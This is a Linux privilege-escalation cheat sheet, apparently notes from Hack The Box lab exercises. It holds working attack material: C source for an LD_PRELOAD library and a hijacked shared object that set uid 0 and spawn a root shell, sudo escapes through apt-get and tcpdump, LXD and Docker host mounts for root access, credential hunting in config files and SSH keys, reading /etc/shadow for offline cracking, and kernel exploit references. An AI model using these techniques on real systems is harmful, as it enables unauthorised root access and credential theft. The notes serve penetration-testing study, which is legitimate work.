
### Simple things to do when you get on the box

##### List Current Processes
```bash
ps aux | grep root
ps au
```
##### Check out the the user, home dir and history
```bash
ls -la /home/winston
history
sudo -l
ls -la /etc/cron.daily/
lsblk
```
##### Writeable dirs or files?
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
##### What am I on?
```bash
uname -a
cat /etc/lsb-release
```
#### Simple kerenel expoit with gcc
```bash
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```
##### pspy
```bash
https://github.com/DominicBreuker/pspy
./pspy64 -pf -i 1000
```
##### Set User ID BIT
```bash
The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
find / -user root -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
or by group
find / -uid 0 -perm -6000 -type f 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
##### Check the front door
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo -l (Find what user can execute without a pass and) search the man to use -postrotate-command option.
ex: sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
##### Path Abuse
```bash
check the contents of the PATH variable
env | grep PATH
echo $PATH
```
##### Cred Hunting
```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
for spool or mail directories
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
```
##### LD_PRELOAD Privilege Escalation
```bash
sudo -l, see apache2 runs /usr/sbin/apache2
compile the root.c exploit
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
##### Share Object Hijacking
```bash
htb_student@NIX02:~$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
ldd to print the shared object required by a binary or shared object.

htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

htb_student@NIX02:~$ readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]

writeable
htb_student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../

Before compiling a library, we need to find the function name called by the binary.
htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

htb_student@NIX02:~$ ./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery

#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

gcc src.c -fPIC -shared -o /development/libshared.so
```
##### Privileged Groups
```bash
LXC/LXD
devops@NIX02:~$ unzip alpine.zip 
devops@NIX02:~$ lxd init
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
devops@NIX02:~$ lxc start r00t

DOCKER
Members of the docker group can spawn new docker containers
docker run -v /root:/mnt -it ubuntu
browse to the mounted directory and retrieve or add SSH keys for the root user
/etc which could be used to retrieve the contents of the /etc/shadow file 
for offline password cracking or adding a privileged user

DISK
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, 
which is typically the main device used by the operating system.
debugfs to access the entire file system with root level privileges

ADM
adm group are able to read all logs stored in /var/log.
gather sensitive data stored in log files or enumerate user actions and running cron jobs.

finging the groups
find / -group groupx 2>/dev/null
```
### Kernel Exploits
```bash
Ubuntu 16.04.4 kernel priv esc - https://vulners.com/zdt/1337DAY-ID-30003
Screen Version 4.5.0 
```
